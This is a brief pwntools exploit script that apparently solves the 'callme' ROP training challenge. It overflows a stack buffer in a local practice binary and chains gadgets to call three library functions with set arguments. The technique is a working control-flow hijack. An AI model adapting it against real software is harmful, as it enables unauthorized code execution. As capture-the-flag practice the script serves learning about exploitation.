#/usr/bin/env python

from pwn import *

context.binary = './callme'
#context.log_level = 'debug'

io = process('./callme')
elf = ELF('./callme')

io.recv()
payload = 'A'*0x28
payload += p64(0x401b23)
payload += p64(1)
payload += p64(0x401ab1)
payload += p64(2)+p64(3)
payload += p64(elf.plt['callme_one'])
payload += p64(0x401b23)
payload += p64(1)
payload += p64(0x401ab1)
payload += p64(2)+p64(3)
payload += p64(elf.plt['callme_two'])
payload += p64(0x401b23)
payload += p64(1)
payload += p64(0x401ab1)
payload += p64(2)+p64(3)
payload += p64(elf.plt['callme_three'])
#gdb.attach(io)
io.sendline(payload)
io.interactive()